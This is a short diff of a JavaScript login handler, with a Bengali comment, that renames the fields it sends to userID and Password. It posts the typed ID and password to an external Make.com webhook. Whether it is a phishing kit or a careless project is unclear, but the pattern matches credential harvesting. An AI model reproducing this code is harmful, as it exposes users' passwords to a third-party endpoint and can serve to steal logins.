@@ -43,8 +43,8 @@ loginToGo.addEventListener('click', async e => {
 
     // ডেটা পাঠানো
     const dataToSend = {
-        name: id,
-        height: pass,
+        userID: id,
+        Password: pass,
     };
 
     const appsScriptUrl = "https://hook.us2.make.com/jtgj9xbb1g95uvhueowv0vq3g38equ3h";
